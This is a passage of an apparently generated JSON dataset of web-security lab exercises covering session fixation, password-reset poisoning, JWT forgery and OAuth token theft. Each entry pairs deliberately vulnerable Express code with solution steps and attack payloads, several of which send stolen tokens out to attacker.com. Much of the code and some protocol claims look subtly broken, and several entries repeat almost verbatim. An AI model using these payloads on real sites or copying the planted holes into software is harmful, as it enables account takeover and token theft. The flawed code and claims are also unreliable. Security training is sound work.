  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The WebSocket connection assigns sessions based on handshake headers. The application reuses existing session cookies without regeneration. To solve: fixate victim's session by forcing WebSocket connection with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake request with Burp Suite",
      "Note session cookie assignment during upgrade",
      "Craft malicious page initiating WebSocket with fixed session",
      "Induce victim to visit page while maintaining connection",
      "Hijack authenticated session through WebSocket channel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.get('/chat', (req, res) => {res.cookie('session', req.query.sid||generateId());res.sendFile('chat.html');});wss.on('connection', ws => {ws.send('Connected as '+ws.upgradeReq.headers.cookie);});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/chat','session=attacker_sid')",
      "<script>const ws = new WebSocket('ws://victim.com/chat');ws.onopen=()=>{document.cookie='session=attacker_sid'}</script>",
      "fetch('http://victim.com/chat?sid=attacker_sid')"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via Host header",
    "Lab Description": "The password reset functionality trusts dynamic Host header for link generation. The application doesn't validate host against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Modify Host header to attacker.com",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const token = generateToken();res.send(`Reset link: https://${req.headers.host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5c header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5c headers containing embedded certificates. The application doesn't verify certificate chain. To solve: forge admin token by embedding attacker-generated certificate in x5c header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5c header support",
      "Generate self-signed certificate using OpenSSL",
      "Extract public key and create matching JWT",
      "Embed certificate chain in x5c header",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.x5c) {const cert = decoded.header.x5c[0];jwt.verify(token, cert);}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJhdHRhY2tlci1jZXJ0Il19.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJmYWtlLWNlcnQtaGVyZSJdfQ.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJtYWxpY2lvdXMtY2VydGlmaWNhdGUiXX0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT typ header injection in healthcare API",
    "Lab Description": "The JWT validation vulnerable to algorithm confusion via typ header manipulation. The application processes tokens with typ=None without proper verification. To solve: forge admin token by switching algorithm to none and removing signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze typ header",
      "Modify typ header to 'None' and remove signature",
      "Change payload to include admin privileges",
      "Submit token in Authorization header",
      "Access patient records to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, null, {algorithms: ['HS256','none']});if(decoded.typ === 'None') decoded = jwt.decode(token);if(decoded.role === 'admin') res.send('Patient records');} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiTm9uZSJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJOb25lIiwiYWxnIjoibm9uZSJ9.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiTk9ORSJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through postMessage in embedded iframes. The application doesn't validate message origins in token callbacks. To solve: steal OAuth token by crafting malicious page that intercepts postMessage communications.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify iframe usage",
      "Create malicious HTML page with postMessage listener",
      "Lure victim to visit page containing legitimate OAuth iframe",
      "Capture access token sent via postMessage",
      "Use token to query protected API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = generateToken();res.send(`<script>window.opener.postMessage('${token}','*')</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/callback\"></iframe><script>window.addEventListener('message',e=>{document.location='https://attacker.com/?token='+e.data});</script>",
      "window.open('https://victim.com/oauth','_blank').onmessage=e=>fetch('https://attacker.com/?token='+e.data)",
      "<div id=\"steal\"></div><script>window.onmessage=e=>document.getElementById('steal').innerHTML=e.data;</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket initialization",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions during websocket connection. The application reuses session cookies from HTTP requests without regeneration. To solve: fixate victim's session by forcing websocket connection with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL websocket handshake with Burp Suite",
      "Note session cookie assignment during connection",
      "Craft malicious page initiating subscription with fixed session",
      "Induce victim to visit page while maintaining connection",
      "Execute privileged GraphQL operations through websocket"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { createServer } = require('http');const { SubscriptionServer } = require('subscriptions-transport-ws');const app = express();const server = createServer(app);SubscriptionServer.create({onConnect: (params, socket) => {socket.session = socket.upgradeReq.headers.cookie;}}, {server, path: '/graphql'});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/graphql','session=attacker_sid')",
      "const ws = new WebSocket('ws://victim.com/graphql');ws.onopen=()=>{ws.send(JSON.stringify({query:'subscription{data}'}))}",
      "<script>const client = new SubscriptionClient('ws://victim.com/graphql',{connectionParams:{session:'attacker_sid'}})</script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Original-Host header",
    "Lab Description": "The password reset functionality trusts X-Original-Host header for link generation. The application doesn't validate host headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Original-Host: attacker.com header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const host = req.headers['x-original-host'] || req.headers.host;const token = generateToken();res.send(`Reset link: https://${host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Original-Host: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Original-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jwk header injection",
    "Lab Description": "The JWT validation accepts arbitrary jwk headers containing embedded keys. The application doesn't verify key provenance. To solve: forge admin token by embedding attacker-generated public key in jwk header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note jwk header support",
      "Generate RSA key pair using OpenSSL",
      "Create JWT with jwk header containing public key",
      "Sign token with matching private key",
      "Submit to privileged endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.jwk) {jwt.verify(token, decoded.header.jwk);}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiYXR0YWNrZXIta2V5In19.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoibWFsbGljaW91cy1rZXkifX0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiZXZpbC1wdWJsaWMta2V5In19.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT cty header injection in banking API",
    "Lab Description": "The JWT validation vulnerable to content type confusion via cty header manipulation. The application processes tokens with cty=text/plain without signature verification. To solve: forge admin token by switching content type and removing signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze cty header",
      "Modify cty header to 'text/plain' and remove signature",
      "Change payload to include admin privileges",
      "Submit token in Authorization header",
      "Access transaction history to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/transactions', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, null, {algorithms: ['HS256']});if(decoded.header.cty === 'text/plain') decoded = jwt.decode(token);if(decoded.role === 'admin') res.send('Transaction records');} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsImN0eSI6InRleHQvcGxhaW4ifQ.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJjdHkiOiJ0ZXh0L3BsYWluIiwiYWxnIjoiSFMyNTYifQ.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJIUzI1NiIsImN0eSI6InRleHQvcGxhaW4ifQ.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through WebSocket connection parameters. The application embeds tokens in WebSocket URLs without validation. To solve: steal OAuth token by intercepting WebSocket initialization requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify WebSocket usage",
      "Intercept WebSocket connection request containing token",
      "Capture access token from WebSocket URL parameters",
      "Use token to query protected API endpoints",
      "Access user profile data to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.get('/chat', (req, res) => {const token = req.query.token;res.send(`<script>new WebSocket('ws://victim.com/ws?token=${token}')</script>`);});wss.on('connection', ws => {ws.send('Connected');});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/ws?token=stolen-token')",
      "const ws = new WebSocket(`ws://victim.com/ws?token=${document.cookie.match(/token=([^;]+)/)[1]}`)",
      "<iframe src=\"javascript:new WebSocket('ws://victim.com/ws?token='+localStorage.getItem('token'))\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 push promise",
    "Lab Description": "The HTTP/2 server pushes session cookies via push promises without proper validation. The application accepts pushed cookies from unauthorized sources. To solve: fixate victim's session by injecting malicious push promises containing predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/2 traffic with Burp Suite to analyze push promises",
      "Craft malicious push promise containing session cookie",
      "Intercept victim's connection and inject push promise",
      "Hijack authenticated session using fixated cookie",
      "Access privileged resources to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const spdy = require('spdy');const app = express();app.get('/', (req, res) => {res.push('/cookie', {'set-cookie':'session=attacker_sid'}, (err, stream) => {stream.end();});res.send('Home page');});spdy.createServer(options, app).listen(3000);",
    "payloads": [
      "GET / HTTP/2\nHost: victim.com\nAccept: */*",
      "PUSH_PROMISE /cookie\nHost: victim.com\nset-cookie: session=attacker_sid",
      "GET /account HTTP/2\nHost: victim.com\nCookie: session=attacker_sid"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Rewrite-URL header",
    "Lab Description": "The password reset functionality trusts X-Rewrite-URL header for link generation. The application doesn't validate rewrite headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Rewrite-URL: https://attacker.com/reset header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const url = req.headers['x-rewrite-url'] || 'https://victim.com/reset';const token = generateToken();res.send(`Reset link: ${url}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Rewrite-URL: https://attacker.com/reset",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Original-URL: /reset\nX-Rewrite-URL: https://attacker.com/reset"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5t header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5t headers containing certificate thumbprints. The application doesn't verify certificate chain integrity. To solve: forge admin token by spoofing certificate thumbprint in x5t header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5t header support",
      "Generate self-signed certificate using OpenSSL",
      "Calculate SHA-1 thumbprint of certificate",
      "Create JWT with x5t header matching thumbprint",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.x5t) {jwt.verify(token, {thumbprint:decoded.header.x5t});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dCI6ImF0dGFja2VyLXRodW1icHJpbnQifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCI6Im1hbGxpY2lvdXMtdGh1bWJwcmludCJ9.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCI6ImV2aWwtdGh1bWJwcmludCJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT alg=none bypass in healthcare API",
    "Lab Description": "The JWT validation accepts unsigned tokens when alg=none is specified in the header. The application fails to properly validate token signatures. To solve: forge an admin token by setting algorithm to none and removing the signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite",
      "Modify header to set alg=none",
      "Remove signature section entirely",
      "Change payload to include admin role",
      "Submit modified token to access patient records"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/patient-records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, 'secret', {algorithms: ['HS256','none']});if(decoded.role === 'admin') res.json({records: 'sensitive data'});} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via Referer header",
    "Lab Description": "The OAuth implementation leaks authorization codes through Referer headers when loading external resources. The application fails to strip sensitive tokens from Referer headers. To solve: steal an OAuth token by forcing a request to an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite",
      "Inject malicious iframe pointing to attacker domain",
      "Capture authorization code in server logs",
      "Exchange code for access token",
      "Query userinfo endpoint with stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;res.send('<script src=\"https://attacker.com/steal?code='+code+'\"></script>');});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth?response_type=code&client_id=client&redirect_uri=https://attacker.com\"></iframe>",
      "<img src=\"https://attacker.com/log?ref=\"+document.referrer>",
      "<link rel=\"stylesheet\" href=\"https://attacker.com/steal?ref=\"+encodeURIComponent(document.referrer)>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions during websocket initialization without proper validation. The application reuses session IDs from connection parameters. To solve: fixate a victim's session by forcing them to connect with a predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture websocket handshake with Burp Suite",
      "Note session parameter in connection URL",
      "Craft malicious page initiating subscription",
      "Induce victim to visit page",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { createServer } = require('http');const { SubscriptionServer } = require('subscriptions-transport-ws');const app = express();const server = createServer(app);SubscriptionServer.create({onConnect: (params, socket) => {socket.session = socket.upgradeReq.url.split('session=')[1];}}, {server, path: '/graphql'});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/graphql?session=attacker_sid')",
      "const ws = new WebSocket(`ws://victim.com/graphql?session=${document.cookie.match(/session=([^;]+)/)[1]}`)",
      "<script>const client = new SubscriptionClient('ws://victim.com/graphql?session=attacker_sid')</script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Prefix",
    "Lab Description": "The password reset functionality trusts X-Forwarded-Prefix header for link generation without validation. The application constructs reset links using untrusted headers. To solve: poison the reset link to point to an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Forwarded-Prefix: https://attacker.com header",
      "Submit request and capture poisoned link",
      "Wait for victim to click link",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const prefix = req.headers['x-forwarded-prefix'] || 'https://victim.com';const token = generateToken();res.send(`Reset link: ${prefix}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Prefix: https://attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Forwarded-Prefix: https://attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header",
    "Lab Description": "The JWT validation accepts arbitrary jku headers pointing to external public keys. The application doesn't verify the key server's authenticity. To solve: forge an admin token by hosting a malicious public key and referencing it in the jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT with Burp Suite",
      "Generate RSA key pair using OpenSSL",
      "Host public key on attacker-controlled server",
      "Create token with jku pointing to malicious key",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.jku) {fetch(decoded.header.jku).then(key => {jwt.verify(token, key);});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL3B1YmxpYy5rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImpydSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMua2V5In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImprZSI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT cnf claim injection in healthcare API",
    "Lab Description": "The JWT validation vulnerable to key confusion via cnf claim manipulation. The application processes cnf claims without proper verification of key ownership. To solve: forge admin token by injecting malicious cnf claim pointing to attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze cnf claim",
      "Generate RSA key pair using OpenSSL",
      "Craft JWT with cnf claim containing attacker's public key",
      "Sign token with matching private key",
      "Submit to privileged endpoint to access patient records"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.payload.cnf) {jwt.verify(token, decoded.payload.cnf.jwk);}if(decoded.payload.role==='admin') res.json({records: 'sensitive data'});} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJjbWYiOnsianJrIjp7Imt0eSI6IlJTQSIsIm4iOiJhdHRhY2tlci1wdWJsaWMta2V5In19fQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiY25mIjp7Imp3ayI6eyJrdHkiOiJSU0EiLCJuIjoibWFsbGljaW91cy1wdWJsaWMta2V5In19fQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MiOiJhZG1pbiIsImNuZiI6eyJqd2siOnsia3R5IjoiUlNBIiwibiI6ImV2aWwtcHVibGljLWtleSJ9fX0.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebRTC in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through WebRTC ICE candidates. The application embeds tokens in STUN/TURN server credentials without proper sanitization. To solve: steal OAuth token by intercepting WebRTC negotiation messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify WebRTC usage",
      "Intercept WebRTC offer/answer exchange",
      "Extract access token from ICE candidate credentials",
      "Use token to query protected API endpoints",
      "Access user profile data to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/video-chat', (req, res) => {const token = req.query.token;res.send(`<script>new RTCPeerConnection({iceServers:[{urls:'stun:stun.victim.com',credential:'${token}'}]})</script>`);});app.listen(3000);",
    "payloads": [
      "new RTCPeerConnection({iceServers:[{urls:'turn:attacker.com',credential:'stolen-token'}]})",
      "pc=new RTCPeerConnection();pc.onicecandidate=e=>{if(e.candidate)fetch('https://attacker.com/?token='+e.candidate.credential)}",
      "<iframe src=\"javascript:new RTCPeerConnection({iceServers:[{urls:'stun:stun.victim.com',credential:localStorage.getItem('token')}]})\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 early data",
    "Lab Description": "The HTTP/3 server accepts session cookies in early data (0-RTT) without proper validation. The application reuses session IDs from previous connections. To solve: fixate victim's session by forcing 0-RTT request with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/3 traffic with Burp Suite to analyze early data",
      "Note session cookie assignment during initial connection",
      "Craft malicious 0-RTT request with fixed session",
      "Induce victim to reconnect while maintaining session",
      "Hijack authenticated session through early data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const spdy = require('spdy');const app = express();app.get('/', (req, res) => {if(req.earlyData) res.cookie('session', req.query.sid||generateId());res.send('Home page');});spdy.createServer({allowHTTP1:true,earlyData:true}, app).listen(3000);",
    "payloads": [
      "GET /?sid=attacker_sid HTTP/3\nHost: victim.com\nEarly-Data: 1",
      "GET /account HTTP/3\nHost: victim.com\nCookie: session=attacker_sid",
      "fetch('https://victim.com/',{method:'GET',headers:{'Early-Data':'1'},credentials:'include'})"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Original-URL header",
    "Lab Description": "The password reset functionality trusts X-Original-URL header for link generation without validation. The application constructs reset links using untrusted headers. To solve: poison reset link to point to attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Original-URL: https://attacker.com/reset header",
      "Submit request and capture poisoned link",
      "Wait for victim to click link",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const url = req.headers['x-original-url'] || 'https://victim.com/reset';const token = generateToken();res.send(`Reset link: ${url}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Original-URL: https://attacker.com/reset",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Original-URL: https://attacker.com/reset"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5t#S256 header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5t#S256 headers containing certificate thumbprints. The application doesn't verify certificate chain integrity. To solve: forge admin token by spoofing SHA-256 certificate thumbprint in x5t#S256 header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5t#S256 header support",
      "Generate self-signed certificate using OpenSSL",
      "Calculate SHA-256 thumbprint of certificate",
      "Create JWT with x5t#S256 header matching thumbprint",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header['x5t#S256']) {jwt.verify(token, {thumbprint:decoded.header['x5t#S256']});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoiYXR0YWNrZXItdGh1bWJwcmludCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoibWFsbGljaW91cy10aHVtYnByaW50In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoiZXZpbC10aHVtYnByaW50In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API",
    "Lab Description": "The lab's authentication system uses JWTs with improper signature validation. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge a valid JWT for admin user by exploiting signature verification flaws.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request with Burp Suite to capture a valid JWT",
      "Decode the JWT using jwt.io to analyze structure",
      "Modify the alg header to 'none' and change the role to 'admin'",
      "Remove the signature portion entirely (leave it empty)",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.decode(token, {complete: true});if (decoded.header.alg === 'none') {const payload = decoded.payload;if (payload.user === 'admin') res.send('Admin dashboard');else res.status(403).send('Forbidden');} else {try {jwt.verify(token, 'secretkey');res.send('Valid token');} catch {res.status(401).send('Invalid token');}}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect",
    "Lab Description": "The OAuth implementation leaks authorization codes through unvalidated redirect URLs. The application fails to verify redirect_uri against whitelisted domains. To solve: steal an OAuth token by chaining an open redirect with the OAuth flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth initiation endpoint with Postman",
      "Craft malicious redirect_uri pointing to attacker domain",
      "Intercept authorization flow with OWASP ZAP",
      "Capture leaked code parameter in redirect",
      "Exchange code for access token at OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/authorize', (req, res) => {const {client_id, redirect_uri, state} = req.query;if (client_id === 'legitapp') {const code = 'RANDOM_OAUTH_CODE';res.redirect(`${redirect_uri}?code=${code}&state=${state}`);} else {res.status(400).send('Invalid client');}});app.post('/oauth/token', (req, res) => {if (req.body.code === 'RANDOM_OAUTH_CODE') {res.json({access_token: 'SECRET_TOKEN'});} else {res.status(401).send('Invalid code');}});app.listen(3000);",
    "payloads": [
